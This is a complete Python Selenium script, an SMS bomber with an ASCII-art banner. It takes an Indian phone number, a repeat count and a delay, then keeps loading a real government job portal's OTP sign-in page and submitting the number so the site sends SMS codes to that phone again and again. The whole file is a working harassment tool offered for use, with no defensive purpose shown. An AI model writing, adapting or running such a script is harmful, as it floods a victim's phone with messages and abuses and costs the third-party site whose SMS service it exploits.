from time import sleep
from dotenv import load_dotenv
import os
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

load_dotenv()

# Configure Firefox options
firefox_options = Options()
firefox_options.headless = True  # Run Firefox in headless mode
firefox_options.binary_location = '/usr/bin/firefox'  # Set the path to the Firefox binary

print("""
    @@@@@@@@@   @        @  @     @  @@@@@@@@@@@@@  @@@@@@@@@@@@@@@
    @       @   @ @      @  @    @         @               @
    @       @   @  @     @  @   @          @               @
    @       @   @   @    @  @  @           @               @
    @@@@@@@@@   @    @   @  @@@            @               @
    @       @   @     @  @  @  @           @               @
    @       @   @      @ @  @   @          @               @
    @       @   @       @@  @    @         @               @
    @       @   @        @  @     @  @@@@@@@@@@@@@         @

""")

# Set the path to the geckodriver executable (Firefox driver)
print("Please enter the path to the geckodriver executable:")
geckodriver_path = input('Path/to/geckodriver: ')

USERNAME = int(input("Enter the number without (+91): "))
iterations = int(input("Enter the number of send sms: "))
delay = float(input("Enter the delay between iterations (in seconds): "))

# Run the code for the specified number of iterations
for _ in range(iterations):
    # Initialize Firefox driver with options
    driver = webdriver.Firefox(options=firefox_options)

    insta_url = 'https://www.pgrkam.com/signin-with-otp'
    driver.get(insta_url)

    username_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'mobile')))
    username_field.send_keys(str(USERNAME))

    login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="rootContent"]/div[1]/div/section/div/div/div[2]/form/div[2]/div/button')))
    login_button.click()

    # Add explicit waits or other necessary steps here

    sleep(5)

    driver.quit()  # Close the browser and quit the driver

    sleep(delay)  # Wait for the specified delay before the next iteration
